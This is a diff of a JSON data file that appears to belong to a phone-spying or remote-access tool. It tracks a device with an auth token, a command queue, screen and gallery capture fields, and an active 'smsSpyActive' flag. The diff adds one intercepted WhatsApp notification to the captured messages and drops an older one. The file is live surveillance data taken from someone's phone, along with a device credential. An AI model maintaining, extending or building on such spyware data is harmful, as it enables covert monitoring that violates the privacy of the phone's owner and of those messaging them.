@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775045333902,
+    "lastSeen": 1775045337076,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13419 pesan): ~ Bot",
+        "content": "𐔈⃘ ֹ ׅ LAMA NGGAK ONLINE! ֹ ׅ ୫\n۫ ╰╼ ׅ ֹ𔖰᷼𔖮 akhirnya muncul juga! @⁨~joo⁩ owner tersayang lagi online nih~",
+        "time": "01/04 20:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775045337504
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8056,14 +8064,6 @@
         "time": "01/04 20:00",
         "pkg": "com.whatsapp",
         "receivedAt": 1775044824837
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15527 pesan dari 10 chat",
-        "time": "01/04 20:00",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775044824657
       }
     ],
     "galleryPhotos": [],
